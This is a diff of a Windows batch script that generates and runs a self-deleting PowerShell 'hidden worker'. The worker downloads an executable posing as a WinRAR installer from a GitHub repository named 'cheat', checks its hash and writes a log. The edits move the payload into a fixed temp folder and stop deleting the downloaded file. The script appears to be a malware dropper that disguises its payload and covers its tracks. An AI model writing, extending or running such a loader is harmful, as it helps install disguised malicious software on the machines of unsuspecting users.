@@ -3,8 +3,9 @@ setlocal EnableExtensions
 
 set "URL=https://raw.githubusercontent.com/skibididodopp-beep/cheat/refs/heads/main/WinRar_setup.exe"
 set "HASH=c746372b0a52a457c0350669874b297d33b9f3b783ba7a7434933fc7d229504e"
-set "OUT=%TEMP%\winrar_pkg_%RANDOM%.exe"
-set "PS_SCRIPT=%TEMP%\winrar_worker_%RANDOM%.ps1"
+set "WORK_DIR=%TEMP%\WinRarPkg"
+set "OUT=%WORK_DIR%\WinRar_setup.exe"
+set "PS_SCRIPT=%TEMP%\winrar_worker.ps1"
 set "LOG=%TEMP%\winrar_worker.log"
 
 > "%PS_SCRIPT%" (
@@ -12,6 +13,7 @@ set "LOG=%TEMP%\winrar_worker.log"
   echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
   echo $u = $env:URL
   echo $h = $env:HASH.ToLowerInvariant^(^)
+  echo $dir = $env:WORK_DIR
   echo $f = $env:OUT
   echo $log = $env:LOG
   echo $psFile = $PSCommandPath
@@ -23,7 +25,9 @@ set "LOG=%TEMP%\winrar_worker.log"
   echo.
   echo try {
   echo     Write-Log "Start hidden worker. URL=$u"
-  echo     if ^(Test-Path -LiteralPath $f^) { Remove-Item -LiteralPath $f -Force }
+  echo     if ^(-not ^(Test-Path -LiteralPath $dir^)^) {
+  echo         New-Item -ItemType Directory -Path $dir -Force ^| Out-Null
+  echo     }
   echo.
   echo     $downloaded = $false
   echo     try {
@@ -67,9 +71,6 @@ set "LOG=%TEMP%\winrar_worker.log"
   echo     Write-Log "FATAL: $($_.Exception.Message)"
   echo     exit 99
   echo } finally {
-  echo     if ^(Test-Path -LiteralPath $f^) {
-  echo         Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue
-  echo     }
   echo     if ^($psFile -and ^(Test-Path -LiteralPath $psFile^)^) {
   echo         Remove-Item -LiteralPath $psFile -Force -ErrorAction SilentlyContinue
   echo     }
